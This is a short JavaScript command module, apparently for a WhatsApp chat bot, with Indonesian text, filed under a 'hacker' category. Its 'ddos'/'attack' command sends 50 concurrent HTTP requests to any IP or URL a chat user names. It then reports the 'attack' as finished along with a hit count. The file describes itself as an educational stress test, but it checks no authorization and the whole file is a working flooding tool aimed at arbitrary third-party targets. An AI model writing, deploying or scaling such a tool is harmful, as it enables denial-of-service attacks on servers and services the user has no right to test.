const axios = require('axios');

module.exports = {
    name: 'ddos',
    command: ['ddos', 'attack'],
    category: 'hacker',
    description: 'Melakukan stress test/DDoS ringan ke target (Untuk edukasi)',
    execute: async (sock, m, { text }) => {
        const from = m.key.remoteJid;
        
        if (!text) {
            return await sock.sendMessage(from, { text: '❌ Masukkan target IP atau URL!' }, { quoted: m });
        }

        await sock.sendMessage(from, { text: `🔥 *Memulai stress test ke ${text}...*\n\n⚠️ _Ini hanya untuk tujuan edukasi._` }, { quoted: m });

        try {
            let successCount = 0;
            let promises = [];
            
            for (let i = 0; i < 50; i++) {
                promises.push(axios.get(text.startsWith('http') ? text : `http://${text}`).then(() => successCount++).catch(() => {}));
            }
            
            await Promise.all(promises);
            
            await sock.sendMessage(from, { 
                text: `✅ *Serangan Selesai!*\n\n🎯 Target: ${text}\n🔫 Total Request: 50\n✔️ Tembus: ${successCount}` 
            }, { quoted: m });
            
        } catch (err) {
            await sock.sendMessage(from, { text: `❌ Gagal melakukan serangan: ${err.message}` }, { quoted: m });
        }
    }
};